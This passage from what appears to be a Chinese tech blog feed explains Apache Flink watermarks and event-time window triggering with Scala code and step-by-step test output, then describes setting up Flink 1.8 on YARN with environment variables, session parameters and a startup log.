class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> env = <span class="type">StreamExecutionEnvironment</span>.getExecutionEnvironment</span><br><span class="line"></span><br><span class="line"><span class="comment">//便于测试，并行度设置为1</span></span><br><span class="line">env.setParallelism(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//env.getConfig.setAutoWatermarkInterval(9000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置为事件时间</span></span><br><span class="line">env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置source 本地socket</span></span><br><span class="line"><span class="keyword">val</span> text: <span class="type">DataStream</span>[<span class="type">String</span>] = env.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> lateText = <span class="keyword">new</span> <span class="type">OutputTag</span>[(<span class="type">String</span>, <span class="type">String</span>, <span class="type">Long</span>, <span class="type">Long</span>)](<span class="string">"late_data"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> value = text.filter(<span class="keyword">new</span> <span class="type">MyFilterNullOrWhitespace</span>)</span><br><span class="line">.flatMap(<span class="keyword">new</span> <span class="type">MyFlatMap</span>)</span><br><span class="line">.assignTimestampsAndWatermarks(<span class="keyword">new</span> <span class="type">MyWaterMark</span>)</span><br><span class="line">.map(x =&gt; (x.name, x.datetime, x.timestamp, <span class="number">1</span>L))</span><br><span class="line">.keyBy(_._1)</span><br><span class="line">.window(<span class="type">TumblingEventTimeWindows</span>.of(<span class="type">Time</span>.seconds(<span class="number">5</span>)))</span><br><span class="line">.sideOutputLateData(lateText)</span><br><span class="line"><span class="comment">//.sum(2)</span></span><br><span class="line">.apply(<span class="keyword">new</span> <span class="type">MyWindow</span>)</span><br><span class="line"><span class="comment">//.window(TumblingEventTimeWindows.of(Time.seconds(3)))</span></span><br><span class="line"><span class="comment">//.apply(new MyWindow)</span></span><br><span class="line">value.getSideOutput(lateText).map(x =&gt; &#123;</span><br><span class="line"><span class="string">"延迟数据|name:"</span> + x._1 + <span class="string">"|datetime:"</span> + x._2</span><br><span class="line">&#125;).print()</span><br><span class="line"></span><br><span class="line">value.print()</span><br><span class="line"></span><br><span class="line">env.execute(<span class="string">"watermark test"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyWaterMark</span> <span class="keyword">extends</span> <span class="title">AssignerWithPeriodicWatermarks</span>[<span class="type">EventObj</span>] </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> maxOutOfOrderness = <span class="number">10000</span>L <span class="comment">// 3.0 seconds</span></span><br><span class="line">  <span class="keyword">var</span> currentMaxTimestamp = <span class="number">0</span>L</span><br><span class="line"></span><br><span class="line">  <span class="keyword">val</span> sdf = <span class="keyword">new</span> <span class="type">SimpleDateFormat</span>(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 用于生成新的水位线，新的水位线只有大于当前水位线才是有效的</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * 通过生成水印的间隔（每n毫秒）定义 ExecutionConfig.setAutoWatermarkInterval(...)。</span></span><br><span class="line"><span class="comment">    * getCurrentWatermark()每次调用分配器的方法，如果返回的水印非空并且大于先前的水印，则将发出新的水印。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getCurrentWatermark</span></span>: <span class="type">Watermark</span> = &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="type">Watermark</span>(<span class="keyword">this</span>.currentMaxTimestamp - <span class="keyword">this</span>.maxOutOfOrderness)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 用于从消息中提取事件时间</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param element                  EventObj</span></span><br><span class="line"><span class="comment">    * @param previousElementTimestamp Long</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">extractTimestamp</span></span>(element: <span class="type">EventObj</span>, previousElementTimestamp: <span class="type">Long</span>): <span class="type">Long</span> = &#123;</span><br><span class="line"></span><br><span class="line">    currentMaxTimestamp = <span class="type">Math</span>.max(element.timestamp, currentMaxTimestamp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> id = <span class="type">Thread</span>.currentThread().getId</span><br><span class="line">    println(<span class="string">"currentThreadId:"</span> + id + <span class="string">",key:"</span> + element.name + <span class="string">",eventTime:["</span> + element.datetime + <span class="string">"],currentMaxTimestamp:["</span> + sdf.format(currentMaxTimestamp) + <span class="string">"],watermark:["</span> + sdf.format(getCurrentWatermark().getTimestamp) + <span class="string">"]"</span>)</span><br><span class="line"></span><br><span class="line">    element.timestamp</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h3><ol><li>设置为事件时间</li><li>接受本地socket数据</li><li>抽取timestamp生成watermark，打印(线程id,key,eventTime,currentMaxTimestamp,watermark）</li><li>event time每隔3秒触发一次窗口，打印（key,窗口内元素个数，窗口内最早元素的时间，窗口内最晚元素的时间，窗口自身开始时间，窗口自身结束时间）</li></ol><h3 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h3><h4 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h4><p>数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"datetime"</span>:<span class="string">"2019-03-26 16:25:24"</span>,<span class="attr">"name"</span>:<span class="string">"zhangsan"</span>&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:24],currentMaxTimestamp:[2019-03-26 16:25:24],watermark:[2019-03-26 16:25:14]</span><br></pre></td></tr></table></figure><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr></tbody></table><h4 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:27&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:27],currentMaxTimestamp:[2019-03-26 16:25:27],watermark:[2019-03-26 16:25:17]</span><br></pre></td></tr></table></figure><p>随着EventTime的升高，Watermark升高。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td></tr></tbody></table><h4 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:34&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:34],currentMaxTimestamp:[2019-03-26 16:25:34],watermark:[2019-03-26 16:25:24]</span><br></pre></td></tr></table></figure><p>到这里，window仍然没有被触发，此时watermark的时间已经等于了第一条数据的Event Time了。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td><strong>2019-03-26 16:25:24</strong></td></tr></tbody></table><h4 id="第四次"><a href="#第四次" class="headerlink" title="第四次"></a>第四次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:35&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25](zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:35],currentMaxTimestamp:[2019-03-26 16:25:35],watermark:[2019-03-26 16:25:25](zhangsan,1,2019-03-26 16:25:24,2019-03-26 16:25:24,2019-03-26 16:25:20,2019-03-26 16:25:25)</span><br></pre></td></tr></table></figure><p>直接证明了window的设定无关数据本身，而是系统定义好了的。<br>输入的数据中，根据自身的Event Time，将数据划分到不同的window中，如果window中有数据，则当watermark时间&gt;=Event Time时，就符合了window触发的条件了，最终决定window触发，还是由数据本身的Event Time所属的window中的window_end_time决定。</p><p>当最后一条数据16:25:35到达是，Watermark提升到16:25:25，此时窗口16:25:20~16:25:25中有数据，Window被触发。</p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr></tbody></table><h4 id="第五次"><a href="#第五次" class="headerlink" title="第五次"></a>第五次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:37&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:37],currentMaxTimestamp:[2019-03-26 16:25:37],watermark:[2019-03-26 16:25:27]</span><br></pre></td></tr></table></figure><p>此时，watermark时间虽然已经达到了第二条数据的时间，但是由于其没有达到第二条数据所在window的结束时间，所以window并没有被触发。</p><p>第二条数据所在的window时间是：<code>[2019-03-26 16:25:25,2019-03-26 16:25:30)</code></p><p>汇总</p><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:27</td><td></td></tr></tbody></table><h4 id="第六次"><a href="#第六次" class="headerlink" title="第六次"></a>第六次</h4><p>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;datetime&quot;:&quot;2019-03-26 16:25:40&quot;,&quot;name&quot;:&quot;zhangsan&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentThreadId:38,key:zhangsan,eventTime:[2019-03-26 16:25:40],currentMaxTimestamp:[2019-03-26 16:25:40],watermark:[2019-03-26 16:25:30](zhangsan,1,2019-03-26 16:25:27,2019-03-26 16:25:27,2019-03-26 16:25:25,2019-03-26 16:25:30)</span><br></pre></td></tr></table></figure><table><thead><tr><th>Key</th><th>EventTime</th><th>currentMaxTimestamp</th><th>Watermark</th><th>WindowStartTime</th><th>WindowEndTime</th></tr></thead><tbody><tr><td>zhangsan</td><td><strong>2019-03-26 16:25:24</strong></td><td>2019-03-26 16:25:24</td><td>2019-03-26 16:25:14</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:27</td><td>2019-03-26 16:25:17</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:34</td><td>2019-03-26 16:25:24</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:35</td><td>2019-03-26 16:25:35</td><td><strong>2019-03-26 16:25:25</strong></td><td><strong>[2019-03-26 16:25:20</strong></td><td><strong>2019-03-26 16:25:25)</strong></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:37</td><td>2019-03-26 16:25:27</td><td></td><td></td></tr><tr><td>zhangsan</td><td>2019-03-26 16:25:40</td><td>2019-03-26 16:25:40</td><td><strong>2019-03-26 16:25:30</strong></td><td><strong>[2019-03-26 16:25:25</strong></td><td><strong>2019-03-26 16:25:30)</strong></td></tr></tbody></table><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>window的触发要符合以下几个条件：</p><ol><li>watermark时间 &gt;= window_end_time</li><li>在[window_start_time,window_end_time)中有数据存在</li></ol><p>同时满足了以上2个条件，window才会触发。<br>watermark是一个全局的值，不是某一个key下的值，所以即使不是同一个key的数据，其warmark也会增加.</p><h3 id="多并行度"><a href="#多并行度" class="headerlink" title="多并行度"></a>多并行度</h3><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8n9vmdiplj20xd0h3wlo.jpg" alt="2.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h3 id="Flink如何处理乱序？"><a href="#Flink如何处理乱序？" class="headerlink" title="Flink如何处理乱序？"></a>Flink如何处理乱序？</h3><p>watermark+window机制。window中可以对input进行按照Event Time排序，使得完全按照Event Time发生的顺序去处理数据，以达到处理乱序数据的目的。</p><h3 id="Flink何时触发window？"><a href="#Flink何时触发window？" class="headerlink" title="Flink何时触发window？"></a>Flink何时触发window？</h3><p>对于late element太多的数据而言</p><ol><li>Event Time &lt; watermark时间</li></ol><p>对于out-of-order以及正常的数据而言</p><ol><li>watermark时间 &gt;= window_end_time</li><li>在[window_start_time,window_end_time)中有数据存在</li></ol><h3 id="Flink应该如何设置最大乱序时间？"><a href="#Flink应该如何设置最大乱序时间？" class="headerlink" title="Flink应该如何设置最大乱序时间？"></a>Flink应该如何设置最大乱序时间？</h3><p>结合自己的业务以及数据情况去设置。</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8n9wgi62lj210b0i446b.jpg" alt="3.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前Flink的Watermark原理老是不明白，并且在CSDN上找的一篇文章，似乎是因为版本的问题，两年前的博客，代码验证下来始终有问题，在网上和人谈论之后，重新用代码验证了，才有点清晰明了，在此记录一下。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://yoursite.com/categories/Flink/"/>
    
    
      <category term="Flink" scheme="http://yoursite.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink集群搭建</title>
    <link href="http://yoursite.com/2019/08/06/Flink%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/08/06/Flink集群搭建/</id>
    <published>2019-08-06T02:48:21.576Z</published>
    <updated>2019-08-09T01:17:48.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Flink集群搭建"><a href="#Flink集群搭建" class="headerlink" title="Flink集群搭建"></a>Flink集群搭建</h1><a id="more"></a> <h3 id="环境"><a href="#环境" class="headerlink" title="环境:"></a>环境:</h3><p>hadoop 2.6.0</p><p>centos 7</p><p>java 1.8.144</p><p>scala 2.11.8</p><p>机器: datanode 126 127 128(ssh)</p><h3 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h3><p>参考:<a href="https://ci.apache.org/projects/flink/flink-docs-stable/ops/deployment/yarn_setup.html#flink-yarn-session" target="_blank" rel="noopener">Flink 官方文档</a></p><p>Flink 1.8</p><p>选择原因: Flink 还处在频繁更新的状态,较新的版本,特性和老版本特别较大,</p><p>Flink 1.8 有如下主要改变:</p><p>1.将会增量清除旧的State<br>2.编程方面TableEnvironment弃用<br>3.Flink1.8将不发布带有Hadoop的二进制安装包</p><p>其中编程方面的改变比较重要,会延续到以后的版本,综合考虑,不使用最新的1.9,使用1.8是较为稳妥的选择.</p><h3 id="Flink安装模式"><a href="#Flink安装模式" class="headerlink" title="Flink安装模式"></a>Flink安装模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">local模式：适用于本地开发和测试环境，占用的资源较少，部署简单 ，只需要部署JDK和flink即可达到功能开发和测试的目的。只需要一台主机即可。</span><br><span class="line"> </span><br><span class="line">standalone cluster：可以在测试环境功能验证完毕到版本发布的时候使用，进行性能验证。搭建需要ssh</span><br><span class="line">jdk和flink。至少需要3台主机，一个master两个worker节点。</span><br><span class="line"> </span><br><span class="line">YARN：flink使用YARN进行调度。</span><br><span class="line"> </span><br><span class="line">Hadoop Integration：和hadoop生态进行整合，可以借用HDFS、YARN的功能，是用于整个大数据环境都用Hadoop全家桶的环境。</span><br><span class="line"> </span><br><span class="line">Docker： 在开发测试使用，docker方式很容易搭建。推荐的方式。</span><br><span class="line"> </span><br><span class="line">kubernetes：由于FLink使用的无状态模式，只需要kubernetes提供计算资源即可。会是Flink以后运行的主流方式，可以起到节约硬件资源和便于管理的效果。</span><br><span class="line"> </span><br><span class="line">HA模式：</span><br><span class="line">现在主流的方式有standalone cluster HA 和YARN cluster HA方式，适用于在生产上部署。</span><br><span class="line">standalone cluster HA：</span><br><span class="line">需要JDK、ssh、zookeeper HA、flink构建，至少需要三个物理机。</span><br><span class="line"> </span><br><span class="line">YARN cluster HA：</span><br><span class="line">需要JDK、ssh、zookeeper HA、Hadoop HA、flink，需要更多的资源。</span><br><span class="line"> </span><br><span class="line">若flink运行于k8s则可以借助于kubernetes的集群提供高可用，充分的利用资源。</span><br><span class="line"> </span><br><span class="line">当前大部分公司还是将Flink运行在物理机上。</span><br></pre></td></tr></table></figure><h3 id="多种安装模式尝试"><a href="#多种安装模式尝试" class="headerlink" title="多种安装模式尝试:"></a>多种安装模式尝试:</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">Flink官方链接</a></p><p>官方链接中可以选择使用scala 2.11 还是 2.12版本.这边选择2.11版本即可.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5ittrsyi7j20an03v3yh.jpg" alt></p><p>下载完成之后, <code>tar zvxf flink-1.8.1-bin-scala_2.11.tgz -C /usr</code>解压</p><h4 id="Yarn配置模式的选择"><a href="#Yarn配置模式的选择" class="headerlink" title="Yarn配置模式的选择:"></a>Yarn配置模式的选择:</h4><p>如果选择Flink on Yarn的话,就比较简单,因为测试集群上已经存在了CDH,所以直接尝试<code>Flink on yarn.</code></p><p>把 Flink 运行在 YARN 上有两种方式，第一种方式是建立一个长期运行的 Flink YARN Session，然后向这个 Session 提交 Flink Job，多个任务同时运行时会共享资源。第二种方式是为单个任务启动一个 Flink 集群，这个任务会独占 Flink 集群的所有资源，任务结束即代表集群被回收。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>因为之前安装使用的CDH 所以系统中没有hadoop的环境变量,这边需要配置hadoop的环境变量才可以继续使用.</p><p>配置如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> hadoop</span><br><span class="line">export HADOOP_HOME=/opt/cloudera/parcels/CDH/lib/hadoop</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> hadoop conf</span><br><span class="line">export HADOOP_CONF_DIR=$&#123;HADOOP_HOME&#125;/etc/hadoop</span><br></pre></td></tr></table></figure><p>配置完成之后  source 立即生效.</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>因为之前说过1.8版本有个新特性就是官方不再发布关联hadoop的二进制包,所以hadoop的依赖我们自己下载.</p><p><a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">下载地址</a></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5ivnayodoj20ob0dyaaz.jpg" alt></p><p>我们的hadoop是2.6的,下载这个2.6版本的就好.</p><p>下载完成后有添加到lib</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flink-shaded-hadoop-2-uber-2.6.5-7.0.jar</span><br></pre></td></tr></table></figure><p>使用yarn session.sh启动yarn的Session模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">启动Session参数说明:</span><br><span class="line">-n(--container)taskmanager的数量 </span><br><span class="line">-s(--slots)用启动应用所需的slot数量/ -s 的值向上取整，有时可以多一些taskmanager，做冗余 每个taskmanager的slot数量，默认一个slot一个core，默认每个taskmanager的slot的个数为16～10</span><br><span class="line">-jmjobmanager的内存（单位MB)3072</span><br><span class="line">-tm每个taskmanager的内存（单位MB)根据core 与内存的比例来设置，-s的值＊ （core与内存的比）来算</span><br><span class="line">-nmyarn 的appName(现在yarn的ui上的名字)｜ </span><br><span class="line">-d后台执行</span><br><span class="line">启动任务参数:</span><br><span class="line">-j运行flink 应用的jar所在的目录</span><br><span class="line">-a运行flink 应用的主方法的参数</span><br><span class="line">-p运行flink应用的并行度</span><br><span class="line">-c运行flink应用的主类, 可以通过在打包设置主类</span><br><span class="line">-nmflink 应用名字，在flink-ui 上面展示</span><br><span class="line">-d后台执行</span><br><span class="line">--fromsavepointflink 应用启动的状态恢复点</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@datanode127 flink-1.8.1]# bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">2019-07-31 11:46:46,986 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.address, localhost</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.port, 6123</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.numberOfTaskSlots, 1</span><br><span class="line">2019-07-31 11:46:46,988 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: parallelism.default, 1</span><br><span class="line">2019-07-31 11:46:47,489 INFO  org.apache.flink.runtime.security.modules.HadoopModule        - Hadoop user set to root (auth:SIMPLE)</span><br><span class="line">2019-07-31 11:46:47,548 INFO  org.apache.hadoop.yarn.client.RMProxy                         - Connecting to ResourceManager at datanode127/172.16.0.127:8032</span><br><span class="line">2019-07-31 11:46:47,766 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Cluster specification: ClusterSpecification&#123;masterMemoryMB=1024, taskManagerMemoryMB=1024, numberTaskManagers=1, slotsPerTaskManager=1&#125;</span><br><span class="line">2019-07-31 11:46:48,018 WARN  org.apache.hadoop.util.NativeCodeLoader                       - Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">2019-07-31 11:46:48,033 WARN  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - The configuration directory ('/data2/flink/flink-1.8.1/conf') contains both LOG4J and Logback configuration files. Please delete or rename one of them.</span><br><span class="line">2019-07-31 11:46:49,540 INFO  